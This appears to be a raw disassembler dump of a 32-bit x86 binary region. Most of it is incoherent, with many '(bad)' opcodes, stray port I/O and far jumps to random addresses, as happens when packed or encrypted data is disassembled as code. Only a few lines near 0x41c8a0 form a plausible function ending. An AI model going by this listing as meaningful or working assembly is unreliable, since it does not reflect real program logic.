  41c59e:	les    ecx,FWORD PTR [edi-0x4fcc425]
  41c5a4:	outs   dx,DWORD PTR ds:[esi]
  41c5a5:	add    DWORD PTR [edx-0x65],esi
  41c5a8:	jl     0x41c59f
  41c5aa:	pushf  
  41c5ab:	sub    al,0xfb
  41c5ad:	and    BYTE PTR [esi+ebp*2+0x5b4fcc16],ch
  41c5b4:	add    dl,BYTE PTR [ecx]
  41c5b6:	sbb    cl,BYTE PTR [edi+0xa]
  41c5b9:	sub    edi,edi
  41c5bb:	mov    BYTE PTR [ecx],bl
  41c5bd:	cmc    
  41c5be:	repnz add BYTE PTR [eax-0x1ce556e4],al
  41c5c5:	mov    bl,0x79
  41c5c7:	xchg   ebx,eax
  41c5c8:	fbld   TBYTE PTR [ecx]
  41c5ca:	in     al,dx
  41c5cb:	dec    esi
  41c5cc:	mov    ds:0x8b9e0f45,eax
  41c5d1:	xchg   esi,eax
  41c5d2:	cld    
  41c5d3:	inc    eax
  41c5d4:	ins    DWORD PTR es:[edi],dx
  41c5d5:	pusha  
  41c5d6:	sar    DWORD PTR ds:0xf53bbf58,1
  41c5dc:	test   al,0x2b
  41c5de:	je     0x41c642
  41c5e0:	cmp    eax,0x3a4516b6
  41c5e5:	sbb    eax,0x60d9cc36
  41c5ea:	frstor [esp+edx*8-0x60562e17]
  41c5f1:	mov    edx,DWORD PTR [edi+eiz*1+0x3b815ea6]
  41c5f8:	das    
  41c5f9:	push   esi
  41c5fb:	lea    eax,[ebp+0xec18e8f]
  41c601:	inc    esp
  41c602:	cli    
  41c603:	nop
  41c604:	fst    QWORD PTR [edx+0x4b8693eb]
  41c60a:	ret    
  41c60b:	lods   al,BYTE PTR ds:[esi]
  41c60c:	ds jmp 0x50cb34ae
  41c612:	shl    BYTE PTR [ecx*2+0x762e6c9f],0xac
  41c61a:	outs   dx,BYTE PTR ds:[esi]
  41c61b:	and    al,0x67
  41c61d:	aad    0x8a
  41c61f:	jno    0x41c5b7
  41c621:	push   ds
  41c622:	add    al,0x82
  41c624:	mov    cl,BYTE PTR [esi-0x6dec6ae8]
  41c62a:	(bad)  
  41c62b:	ficom  WORD PTR [esi+0x1ef2ce60]
  41c631:	adc    al,0xa9
  41c633:	inc    edi
  41c634:	imul   ecx,ebp,0x69
  41c637:	xor    al,0xaa
  41c639:	dec    ebx
  41c63a:	dec    esi
  41c63b:	jo     0x41c602
  41c63d:	stos   BYTE PTR es:[edi],al
  41c63e:	adc    edi,DWORD PTR [esi-0x652780eb]
  41c644:	scas   al,BYTE PTR es:[edi]
  41c645:	push   0xffffffac
  41c647:	sbb    DWORD PTR es:[esi],esp
  41c64a:	fs jle 0x41c6b4
  41c64d:	and    al,0x25
  41c64f:	and    ebp,esi
  41c651:	sub    esp,DWORD PTR [ebx-0x6dd5660e]
  41c657:	jbe    0x41c63b
  41c659:	jnp    0x41c672
  41c65b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c65c:	mov    ah,0x9b
  41c65e:	sbb    dh,BYTE PTR [ebx]
  41c660:	fld    QWORD PTR [ecx+0x66e1b614]
  41c666:	lock push ds
  41c668:	test   ebx,ebp
  41c66a:	imul   esp,ebx,0xffffffd8
  41c66d:	sti    
  41c66e:	fistp  DWORD PTR [ebp-0x7d]
  41c671:	repnz add dl,BYTE PTR [edi+0x32]
  41c675:	xchg   DWORD PTR [ebx-0x300c069c],esi
  41c67b:	clc    
  41c67c:	pop    eax
  41c67d:	jnp    0x41c64a
  41c67f:	lods   al,BYTE PTR ds:[esi]
  41c680:	jns    0x41c65d
  41c682:	sub    eax,0x74168922
  41c687:	add    DWORD PTR [edx-0x7f],0xb4e9583
  41c68e:	cmc    
  41c68f:	xchg   edi,eax
  41c690:	jno    0x41c69f
  41c692:	push   es
  41c693:	or     eax,0x84b236e9
  41c698:	or     DWORD PTR [ecx*4+0x62eca356],edx
  41c69f:	and    al,0xb2
  41c6a1:	dec    ecx
  41c6a2:	call   0xb7a3:0xb62010a3
  41c6a9:	aaa    
  41c6aa:	jmp    0x41c64b
  41c6ac:	jns    0x41c6d7
  41c6ae:	mov    bl,0x4
  41c6b0:	mov    eax,0xc7af9b06
  41c6b5:	mov    ecx,0x44766e13
  41c6ba:	popa   
  41c6bb:	ss dec eax
  41c6bd:	(bad)  
  41c6be:	mov    DWORD PTR [ebx+0x5d],esp
  41c6c1:	and    BYTE PTR [eax+0x51639f74],0x90
  41c6c8:	cdq    
  41c6c9:	cmp    al,0xa4
  41c6cb:	ret    
  41c6cc:	pop    eax
  41c6cd:	jnp    0x41c747
  41c6cf:	sub    ah,BYTE PTR [edi-0x3f]
  41c6d2:	ror    DWORD PTR [edx+0x66977235],0xc0
  41c6d9:	ja     0x41c6ff
  41c6db:	mov    al,ds:0xaf0a06eb
  41c6e0:	xor    al,0x5c
  41c6e2:	push   edi
  41c6e3:	inc    esp
  41c6e4:	xchg   ebp,eax
  41c6e5:	ds iret 
  41c6e7:	bound  ebx,QWORD PTR [edx+edx*2+0x7c3fb052]
  41c6ee:	pop    ebx
  41c6ef:	nop
  41c6f0:	leave  
  41c6f1:	or     eax,0xca74e74b
  41c6f6:	or     bh,BYTE PTR [esi]
  41c6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f9:	add    edi,ebp
  41c6fb:	in     al,0x1
  41c6fd:	das    
  41c6fe:	stc    
  41c6ff:	or     eax,0x12f99311
  41c704:	or     esp,edi
  41c706:	dec    ecx
  41c707:	call   0x53d2:0xf763a827
  41c70e:	add    ch,0x77
  41c711:	cmp    esi,DWORD PTR [ebp-0x4832820f]
  41c717:	pop    ss
  41c718:	mov    ebp,0xc5c4e546
  41c71d:	sbb    dh,BYTE PTR [eax-0x6cc02a4]
  41c723:	or     al,0xa4
  41c725:	iret   
  41c726:	add    BYTE PTR [edi+0x38],ah
  41c729:	mov    ecx,0xd8b33aba
  41c72e:	cmp    al,0x88
  41c730:	adc    edi,ebx
  41c732:	or     dh,BYTE PTR [edx]
  41c734:	in     eax,0xc6
  41c736:	jmp    0xcbb87f02
  41c73b:	pop    edx
  41c73d:	outs   dx,BYTE PTR ds:[esi]
  41c73e:	in     al,dx
  41c73f:	xor    BYTE PTR [ecx+ecx*2-0x72b0ecaa],dl
  41c746:	sbb    cl,bh
  41c748:	pop    esi
  41c749:	xor    eax,0x5dca787f
  41c74e:	push   esp
  41c74f:	push   eax
  41c750:	jle    0x41c719
  41c752:	loopne 0x41c6d9
  41c754:	(bad)  
  41c755:	push   ss
  41c756:	nop
  41c757:	js     0x41c7bf
  41c759:	mov    eax,ds:0xcb8db20e
  41c75e:	adc    ch,BYTE PTR [ebx-0x5c39f7b7]
  41c764:	dec    esi
  41c765:	jnp    0x41c722
  41c767:	lods   al,BYTE PTR ds:[esi]
  41c768:	dec    esi
  41c769:	sub    ecx,DWORD PTR [edx+0x36]
  41c76c:	cmp    DWORD PTR [ebp+0x732221f6],ebp
  41c772:	pop    eax
  41c773:	cmp    ah,BYTE PTR [esi]
  41c775:	mov    DWORD PTR [edx+0x32b64ae7],ebx
  41c77b:	xchg   esi,eax
  41c77c:	inc    ecx
  41c77d:	fstp   QWORD PTR [esi]
  41c77f:	jp     0x41c710
  41c781:	scas   eax,DWORD PTR es:[edi]
  41c782:	sbb    al,0xdd
  41c784:	add    BYTE PTR [esi-0x7e],dh
  41c787:	adc    eax,0x2c945bfd
  41c78c:	gs adc al,0x1f
  41c78f:	stc    
  41c790:	enter  0x7f4e,0x29
  41c794:	adc    edi,edx
  41c796:	or     cl,BYTE PTR [ecx+0x6e31985e]
  41c79c:	jb     0x41c7ea
  41c79e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c79f:	jmp    0xa2c08d37
  41c7a4:	or     ebp,DWORD PTR [edi+0x4720eba7]
  41c7aa:	xchg   edi,eax
  41c7ab:	dec    ebp
  41c7ac:	(bad)  
  41c7ad:	ins    DWORD PTR es:[edi],dx
  41c7ae:	ret    0x9069
  41c7b1:	leave  
  41c7b2:	sar    BYTE PTR [edx+0x15],0x0
  41c7b6:	add    al,BYTE PTR [edi-0x41bbf8e4]
  41c7bc:	fiadd  DWORD PTR ds:0x34232d9c
  41c7c2:	sbb    ebx,0xa8b9cbf0
  41c7c8:	mov    dh,0x72
  41c7ca:	or     bl,BYTE PTR [edi+edi*8-0x14]
  41c7ce:	out    dx,al
  41c7cf:	jmp    0x41c827
  41c7d1:	mov    DWORD PTR [eax+0x64],ebx
  41c7d4:	and    dl,bl
  41c7d6:	and    eax,0x268b258b
  41c7db:	cmc    
  41c7dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7dd:	add    bl,bh
  41c7df:	fdivp  st(2),st
  41c7e1:	jl     0x41c814
  41c7e3:	add    BYTE PTR [ecx+ebx*1-0x58],bh
  41c7e7:	mov    bl,0xe8
  41c7e9:	mov    dh,0xe6
  41c7eb:	test   eax,0x548fb727
  41c7f0:	int    0xa8
  41c7f2:	fstp   QWORD PTR [ebp+0x1d]
  41c7f5:	ja     0x41c869
  41c7f7:	add    eax,0x3ec0067b
  41c7fc:	cmp    ebx,0x5a
  41c7ff:	sbb    DWORD PTR [eax+0x14],0x46
  41c803:	gs add al,0x1
  41c806:	popf   
  41c807:	sub    ecx,DWORD PTR [ebx+ecx*1+0x565d5be5]
  41c80e:	pop    ebx
  41c80f:	fild   WORD PTR [eax-0x43b41e0a]
  41c815:	sbb    bl,al
  41c817:	lds    ebx,FWORD PTR ds:0xf8b611e3
  41c81d:	inc    edi
  41c81e:	sbb    BYTE PTR [eax+0x16b4e529],bh
  41c824:	popa   
  41c825:	mov    ecx,0xb0777eef
  41c82a:	test   DWORD PTR [esi+0x7b4d1499],esp
  41c830:	pop    ds
  41c831:	push   ds
  41c832:	mov    dl,0x3a
  41c834:	fucomip st,st(4)
  41c836:	leave  
  41c837:	stos   BYTE PTR es:[edi],al
  41c838:	int    0xd6
  41c83a:	or     BYTE PTR ds:0x9a5d33a8,ch
  41c840:	outs   dx,DWORD PTR ds:[esi]
  41c841:	inc    esi
  41c842:	push   ss
  41c843:	mov    eax,ecx
  41c845:	ror    esi,1
  41c847:	adc    eax,0x73093a9f
  41c84c:	mov    al,ds:0xd131277
  41c851:	mov    ch,0x61
  41c853:	sbb    esp,DWORD PTR [ebp-0x54]
  41c856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c857:	sbb    cl,bl
  41c859:	inc    eax
  41c85a:	mov    edi,0x7ac206d0
  41c85f:	test   BYTE PTR [esi],dh
  41c861:	push   ebx
  41c862:	mov    ch,bh
  41c864:	mov    ds:0x29c0cede,al
  41c869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c86a:	fsubr  st,st(2)
  41c86c:	mov    bh,0xb6
  41c86e:	inc    BYTE PTR [ebx+0x7f]
  41c871:	arpl   ax,ax
  41c873:	in     eax,dx
  41c874:	add    bh,BYTE PTR [ebx-0x5fbf8779]
  41c87a:	rol    ebx,1
  41c87c:	push   esp
  41c87d:	adc    al,dh
  41c87f:	(bad)
  41c882:	mov    ds:0x1b37a698,al
  41c887:	sar    dh,1
  41c889:	and    BYTE PTR [edi-0x39],bh
  41c88c:	adc    al,BYTE PTR [esi+0x48]
  41c88f:	lock push si
  41c892:	fistp  WORD PTR [ebp-0x3c]
  41c895:	inc    esp
  41c896:	std    
  41c897:	inc    eax
  41c898:	mov    ebp,0x52fd87bc
  41c89d:	lsl    eax,cx
  41c8a0:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8a3:	imul   eax,ecx
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0x9b5b88e2
  41c8c2:	cmp    BYTE PTR [eax+0x185af],dh
  41c8c8:	lods   al,BYTE PTR ds:[esi]
  41c8c9:	add    BYTE PTR [eax],al
  41c8cb:	add    ah,ah
  41c8cd:	pop    esp
  41c8ce:	mov    al,ds:0xc974a098
  41c8d3:	repz in al,0xc3
  41c8d6:	push   ecx
  41c8d7:	mov    dh,0x90
  41c8d9:	xchg   ebp,eax
  41c8da:	sbb    al,0xde
  41c8dc:	int3   
  41c8dd:	(bad)  
  41c8de:	push   ecx
  41c8df:	sub    bl,BYTE PTR [edi-0x5aead035]
  41c8e5:	jmp    0x99f750a
  41c8ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8eb:	fistp  DWORD PTR [ebp-0x64]
  41c8ee:	ficom  DWORD PTR [esi+ecx*8]
  41c8f1:	dec    edx
  41c8f2:	xbegin 0x4876c61b
  41c8f8:	pop    es
  41c8f9:	scas   eax,DWORD PTR es:[edi]
  41c8fa:	or     al,BYTE PTR [edx+0x1a7ca61c]
  41c900:	inc    esi
  41c901:	jb     0x41c93b
  41c903:	dec    eax
  41c904:	xchg   edx,eax
  41c905:	jo     0x41c8c3
  41c907:	push   eax
  41c908:	in     eax,dx
  41c909:	(bad)  
  41c90a:	out    dx,eax
  41c90b:	aas    
  41c90c:	retf   
  41c90d:	adc    eax,0xd6e9d403
  41c912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c913:	test   al,0x49
  41c915:	inc    ebx
  41c916:	adc    edi,DWORD PTR [edi]
  41c918:	mov    ecx,0xab125fb4
  41c91d:	mov    esi,0x798cc7ea
  41c922:	push   0xffffffcf
  41c924:	or     dh,BYTE PTR [edi+edi*4]
  41c927:	add    BYTE PTR [edi+0x3],dl
  41c92a:	pop    es
  41c92b:	inc    edx
  41c92c:	cmp    al,0xd8
  41c92e:	inc    ebx
  41c92f:	scas   al,BYTE PTR es:[edi]
  41c930:	jbe    0x41c8ef
  41c932:	pop    eax
  41c933:	enter  0xebb6,0xfa
  41c937:	add    edi,edi
  41c939:	push   cs
  41c93a:	loopne 0x41c8d8
  41c93c:	rcl    BYTE PTR [ebx],0x5e
  41c93f:	push   ss
  41c940:	out    0x9c,al
  41c942:	cmp    bl,BYTE PTR [ebp+0x2e]
  41c945:	jno    0x41c98f
  41c947:	inc    eax
  41c948:	ja     0x41c917
  41c94a:	xchg   edx,eax
  41c94b:	add    eax,DWORD PTR [edi+0x63]
  41c94e:	jecxz  0x41c9ae
  41c950:	lods   eax,DWORD PTR ds:[esi]
  41c951:	in     eax,0x54
  41c953:	mov    eax,0xc9fcb191
  41c958:	fild   QWORD PTR [edi]
  41c95a:	sbb    DWORD PTR [ecx],edx
  41c95c:	mov    ebx,0xe4269de4
  41c961:	xchg   ebx,eax
  41c962:	inc    esi
  41c963:	cbw    
  41c965:	cwde   
  41c966:	ror    BYTE PTR [ebx+0x6e299577],0xc2
  41c96d:	call   0xeb97:0xbaf241ec
  41c974:	fdivr  st,st(7)
  41c976:	pop    esp
  41c977:	xchg   ecx,eax
	...
  41c984:	shr    DWORD PTR [esp+edx*1],1
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0xf53781f
  41c994:	pop    ebx
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [eax+eax*1+0x69350000],ch
  41c99e:	mov    BYTE PTR [edi],ah
  41c9a0:	dec    ebx
  41c9a1:	(bad)  
  41c9a2:	fcomp  QWORD PTR [esi]
  41c9a4:	jns    0x41c987
  41c9a6:	inc    ecx
  41c9a7:	or     al,0xc1
  41c9a9:	xor    al,bl
  41c9ab:	adc    al,0x15
  41c9ad:	sub    BYTE PTR [esi],0x87
  41c9b0:	jmp    0x41c9df
  41c9b2:	push   ebp
  41c9b3:	not    BYTE PTR [ebx-0x506ee4b6]
  41c9b9:	inc    eax
  41c9ba:	inc    esp
  41c9bb:	inc    esp
  41c9bc:	shl    DWORD PTR [eax],0x66
  41c9bf:	imul   ebx,DWORD PTR [eax+0x14],0xfffffff7
  41c9c3:	(bad)  
  41c9c4:	cli    
  41c9c5:	(bad)  
  41c9c7:	xchg   esp,eax
  41c9c8:	(bad)  
  41c9cb:	je     0x41c9b8
  41c9cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9ce:	out    dx,al
  41c9cf:	sub    DWORD PTR [ebx-0x65],ecx
  41c9d2:	or     eax,0xe87d8f6e
  41c9d7:	idiv   DWORD PTR [esi]
  41c9d9:	pop    ecx
  41c9da:	ret    
  41c9db:	mov    ah,0x38
  41c9dd:	cmp    eax,0xe36238e2
  41c9e2:	aaa    
  41c9e3:	xchg   esp,eax
  41c9e4:	cs in  al,0x29
  41c9e7:	jbe    0x41ca19
  41c9e9:	gs (bad) 
  41c9eb:	mov    esp,0x1a94475a
  41c9f0:	out    dx,eax
  41c9f1:	jo     0x41c9ae
  41c9f3:	inc    esi
  41c9f4:	pop    es
  41c9f5:	call   0x1ee31fdb
  41c9fa:	add    edi,DWORD PTR [bp+di]
  41c9fd:	cmc    
  41c9fe:	ja     0x41ca57
  41ca00:	mov    eax,0x4f25f5d8
  41ca05:	fist   WORD PTR [ebp-0x9ae4155]
  41ca0b:	push   ss
  41ca0c:	push   es
  41ca0d:	pop    edx
  41ca0e:	push   0x11
  41ca10:	dec    esi
  41ca11:	xor    edi,ebp
  41ca13:	mov    dh,0x65
  41ca15:	jo     0x41ca02
  41ca17:	cmp    ebx,DWORD PTR [edi-0x63]
  41ca1a:	fabs   
  41ca1c:	out    0xe4,al
  41ca1e:	sub    edx,DWORD PTR [edx-0x4e]
  41ca21:	xor    al,0x35
  41ca23:	icebp  
  41ca24:	or     BYTE PTR [eax-0x5e],bl
  41ca27:	daa    
  41ca28:	add    ebx,DWORD PTR [ecx-0x719a8c97]
  41ca2e:	pop    edi
  41ca2f:	xchg   ecx,eax
  41ca30:	xchg   ebp,eax
  41ca31:	je     0x41c9de
  41ca33:	out    dx,al
  41ca34:	out    dx,eax
  41ca35:	daa    
  41ca36:	loopne 0x41ca39
  41ca38:	jmp    0x5f14:0xe72e49c4
  41ca3f:	mov    bl,0xbc
  41ca41:	inc    ebx
  41ca42:	(bad)  
  41ca43:	out    0xe5,al
  41ca45:	stos   DWORD PTR es:[edi],eax
  41ca46:	es push ebp
	...
  41ca54:	pop    ds
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2+0x19dc74d0],0x7
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [eax+eax*1-0x2ba10000],ch
  41ca6e:	daa    
  41ca6f:	aaa    
  41ca70:	sub    eax,0x1127d335
  41ca75:	inc    eax
  41ca76:	sbb    bh,dh
  41ca78:	push   esp
  41ca79:	sbb    eax,0x23e38903
  41ca7e:	mov    ds:0x61f9771f,eax
  41ca83:	adc    DWORD PTR [ebx+ecx*2-0x66ffc951],esp
  41ca8a:	outs   dx,BYTE PTR ds:[esi]
  41ca8b:	mov    DWORD PTR [ecx+0x40],ecx
  41ca8e:	adc    esi,ebp
  41ca90:	cmp    al,0xd4
  41ca92:	call   0x7844875e
  41ca97:	test   edi,esp
  41ca99:	aam    0x26
  41ca9b:	ja     0x41cb14
  41ca9d:	xchg   ebx,eax
  41ca9e:	aaa    
  41ca9f:	inc    edx
  41caa0:	(bad)  
  41caa1:	imul   esi,DWORD PTR [edi+0x62],0xffffffe3
  41caa5:	rol    WORD PTR [ebp-0x1b30701f],cl
  41caac:	nop
  41caad:	cmp    eax,0x4b823a45
  41cab2:	enter  0x568,0x7b
  41cab6:	jge    0x41cb26
  41cab8:	dec    ecx
  41cab9:	push   0x4ebc5d46
  41cabe:	fxch   st(4)
  41cac0:	aam    0xd3
  41cac2:	ret    0xeab1
  41cac5:	or     DWORD PTR [esi+ebp*2-0x3e3d74c6],edx
  41cacc:	mov    cl,0x99
  41cace:	in     eax,dx
  41cacf:	jl     0x41cb4d
  41cad1:	mov    bl,BYTE PTR [ebx]
  41cad3:	idiv   DWORD PTR [edx+0x2eb999e9]
  41cad9:	push   esp
  41cada:	icebp  
  41cadb:	scas   al,BYTE PTR es:[edi]
  41cadc:	jno    0x41cb4c
  41cade:	fwait
  41cadf:	cwde   
  41cae0:	cwde   
  41cae1:	and    ah,dl
  41cae3:	sub    DWORD PTR [eax],ebp
  41cae5:	mov    cl,0xb
  41cae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cae8:	daa    
  41cae9:	lock sub bl,BYTE PTR [eax]
  41caec:	cvttps2pi mm7,QWORD PTR [ebx]
  41caef:	fiadd  DWORD PTR [esi+0x3e]
  41caf2:	or     al,0x9
  41caf4:	pop    esp
  41caf5:	pop    ebx
  41caf6:	into   
  41caf7:	jae    0x41cb00
  41caf9:	xchg   ecx,eax
  41cafa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cafb:	xor    dl,bl
  41cafd:	inc    edi
  41cafe:	push   esi
  41caff:	dec    esp
  41cb00:	mov    edi,DWORD PTR [ecx]
  41cb02:	add    ebx,DWORD PTR [ecx]
  41cb04:	jp     0x41ca94
  41cb06:	mov    al,0xc1
  41cb08:	sbb    esi,DWORD PTR [edi-0x4762b400]
  41cb0e:	inc    eax
  41cb0f:	xchg   ecx,eax
  41cb10:	(bad)
  41cb13:	jecxz  0x41cb8a
  41cb15:	cli    
  41cb16:	and    DWORD PTR [ebx+0x0],ebx
	...
  41cb21:	add    BYTE PTR [eax],al
  41cb23:	add    BYTE PTR [edi],ch
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	pushf  
  41cb31:	in     al,dx
  41cb32:	test   al,0x14
  41cb34:	mov    bl,0x87
  41cb36:	add    DWORD PTR [eax],eax
  41cb38:	lods   al,BYTE PTR ds:[esi]
  41cb39:	add    BYTE PTR [eax],al
  41cb3b:	add    BYTE PTR [edx-0x62],ah
  41cb3e:	int3   
  41cb3f:	jae    0x41cb73
  41cb41:	mov    cl,0x56
  41cb43:	stc    
  41cb44:	mov    eax,0xd465424c
  41cb49:	adc    ah,BYTE PTR [ebx]
  41cb4b:	pop    edi
  41cb4c:	mov    BYTE PTR [edi],ah
  41cb4e:	mov    ds:0xda36ee5e,eax
  41cb53:	(bad)  
  41cb54:	mov    ecx,0xfe5d09a3
  41cb59:	out    dx,eax
  41cb5a:	or     DWORD PTR [edi-0x33],eax
  41cb5d:	lock pop ebp
  41cb5f:	sbb    ebp,edx
  41cb61:	in     eax,0x96
  41cb63:	mov    ebx,0xc7369cef
  41cb68:	rol    DWORD PTR [edi-0x254dfc52],1
  41cb6e:	fwait
  41cb6f:	mov    esp,esp
  41cb71:	cwde   
  41cb72:	xor    al,0xce
  41cb74:	into   
  41cb75:	inc    ebx
  41cb76:	push   eax
  41cb77:	imul   ebp,DWORD PTR [eax+0x763a9975],0xf873b8a4
  41cb81:	cmp    esi,0xa7dc3b46
  41cb87:	jge    0x41cb24
  41cb89:	or     al,0xcf
  41cb8b:	mov    esi,0x77532e0d
  41cb91:	mov    cl,0x4d
  41cb93:	nop    esi
  41cb96:	sbb    eax,0x258a38c5
  41cb9b:	clc    
  41cb9c:	aad    0x9d
  41cb9e:	sahf   
  41cb9f:	mov    eax,ds:0x4a34f034
  41cba4:	adc    eax,0x84e66af9
  41cba9:	mov    DWORD PTR [esp+eiz*4-0x7f],esi
  41cbad:	jns    0x41cb75
  41cbaf:	dec    edi
  41cbb0:	adc    ecx,0xc3b1664d
  41cbb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbb7:	pushf  
  41cbb8:	dec    eax
  41cbb9:	cmp    ecx,esp
  41cbbb:	outs   dx,DWORD PTR ds:[esi]
  41cbbc:	cmp    bl,BYTE PTR [ebx]
  41cbbe:	add    al,BYTE PTR [ecx-0x2d146d5f]
  41cbc4:	inc    ecx
  41cbc5:	bound  ecx,QWORD PTR [ebx-0x81fe68c]
  41cbcb:	dec    ebp
  41cbcc:	add    edi,eax
  41cbce:	pop    ecx
  41cbcf:	and    DWORD PTR [eax],esp
  41cbd1:	inc    ebx
  41cbd2:	cdq    
  41cbd3:	xchg   BYTE PTR [edi],cl
  41cbd5:	push   cs
  41cbd6:	pop    ebx
  41cbd7:	pop    ds
  41cbd8:	mov    dh,BYTE PTR [edi-0x11817b92]
  41cbde:	cmp    ah,BYTE PTR [eax]
  41cbe0:	ss out dx,eax
  41cbe2:	test   DWORD PTR [ebx],ebx
  41cbe4:	imul   ecx,DWORD PTR [esi+0x6d3e],0x0
	...
  41cbf3:	add    dl,cl
  41cbf5:	mov    al,ds:0xdf7e4d76
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0x7340f889,al
  41cc04:	pop    edi
  41cc05:	mov    BYTE PTR [ecx],al
  41cc07:	add    BYTE PTR [eax+eax*1-0x565a0000],ch
  41cc0e:	xchg   ecx,eax
  41cc0f:	js     0x41cc43
  41cc11:	imul   esi,DWORD PTR [ebp*1+0x7d0764fa],0xcc79ce82
  41cc1c:	push   edx
  41cc1d:	test   BYTE PTR [edx+0x5f],0xb
  41cc21:	xchg   DWORD PTR [esi-0x23cd85e4],eax
  41cc27:	imul   esp,DWORD PTR [edi-0x2dc3b161],0x9f651dea
  41cc31:	sbb    ah,dh
  41cc33:	in     eax,0x8a
  41cc35:	dec    ebp
  41cc36:	dec    ebp
  41cc37:	mov    ds:0x8f6f05bb,al
  41cc3c:	fdivr  QWORD PTR ds:0x36712931
  41cc42:	or     eax,0x41888a79
  41cc47:	inc    ecx
  41cc48:	test   eax,0x7172ab3
  41cc4d:	dec    edx
  41cc4e:	retf   
  41cc4f:	scas   eax,DWORD PTR es:[edi]
  41cc50:	inc    esp
  41cc51:	aad    0xde
  41cc53:	inc    esi
  41cc54:	push   ecx
  41cc55:	iret   
  41cc56:	cmp    al,0x29
  41cc58:	mov    ds:0x888c58ee,al
  41cc5e:	jg     0x41cc11
  41cc60:	cwde   
  41cc61:	push   ebp
  41cc62:	fidivr DWORD PTR [edi-0x64]
  41cc65:	hlt    
  41cc66:	pop    ebp
  41cc67:	pop    ss
  41cc68:	mov    ecx,0xaf3ee37d
  41cc6d:	and    al,0x71
  41cc6f:	sub    ebx,edx
  41cc71:	mov    al,0x6c
  41cc73:	jp     0x41cc6a
  41cc75:	adc    DWORD PTR [edx],ebp
  41cc77:	push   ds
  41cc78:	enter  0xd4e2,0x6d
  41cc7c:	mov    bh,0xae
  41cc7e:	lods   eax,DWORD PTR ds:[esi]
  41cc7f:	xchg   esp,eax
  41cc80:	inc    esp
  41cc81:	mov    sp,WORD PTR [eax-0x18f739f7]
  41cc88:	add    BYTE PTR [ebx],0xe0
  41cc8b:	push   ebp
  41cc8c:	je     0x41cc29
  41cc8e:	(bad)
  41cc92:	push   0xfbb28073
  41cc97:	jae    0x41cd0d
  41cc99:	push   es
  41cc9a:	loope  0x41ccfc
  41cc9c:	push   0x6
  41cc9e:	fist   WORD PTR [ecx+0x68]
  41cca1:	or     al,0x59
  41cca3:	js     0x41cce9
  41cca5:	cs or  al,0x42
  41cca8:	cld    
  41cca9:	dec    ebx
  41ccaa:	pop    edi
  41ccab:	dec    esp
  41ccac:	mov    ch,0x4a
  41ccae:	and    dl,BYTE PTR [edi]
  41ccb0:	pop    ebx
  41ccb1:	pop    ebp
  41ccb2:	xor    eax,0x2d46e7cb
  41ccb7:	mov    ds:0x0,eax
	...
  41ccc4:	(bad)  
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	into   
  41ccd1:	repnz mov eax,ds:0x1890b58
  41ccd7:	add    BYTE PTR [eax+eax*1-0xfc0000],ch
  41ccde:	push   DWORD PTR [eax-0x7a2df920]
  41cce4:	push   eax
  41cce5:	pushf  
  41cce6:	pop    eax
  41cce7:	or     ah,cl
  41cce9:	add    esp,ebx
  41cceb:	mov    al,ds:0xb1acfbe2
  41ccf0:	std    
  41ccf1:	repz adc dh,dh
  41ccf4:	arpl   WORD PTR [edx+0x4e4bbf0a],bx
  41ccfa:	adc    ch,ah
  41ccfc:	test   DWORD PTR [edx+edi*4+0x39b4cb4d],edx
  41cd03:	scas   eax,DWORD PTR es:[edi]
  41cd04:	outs   dx,DWORD PTR ds:[esi]
  41cd05:	imul   eax,DWORD PTR [ecx],0x1a
  41cd08:	sbb    al,0x40
  41cd0a:	and    DWORD PTR [edi+ebx*4],ebx
  41cd0d:	int3   
  41cd0e:	repnz add esi,DWORD PTR [ebp+eiz*8+0x16aed1ca]
  41cd16:	cs cmc 
  41cd18:	cdq    
  41cd19:	jne    0x41cd3c
  41cd1b:	adc    eax,0x32ff5aa8
  41cd20:	sbb    BYTE PTR [edi-0x30b4f672],0x66
  41cd27:	fist   WORD PTR [eax-0x76]
  41cd2a:	add    al,0xb9
  41cd2c:	xor    BYTE PTR ds:0x62fd4743,al
  41cd32:	in     al,0x8f
  41cd34:	ror    BYTE PTR [ebp-0x1109fd93],1
  41cd3a:	popa   
  41cd3b:	cmp    eax,0xfd1c0887
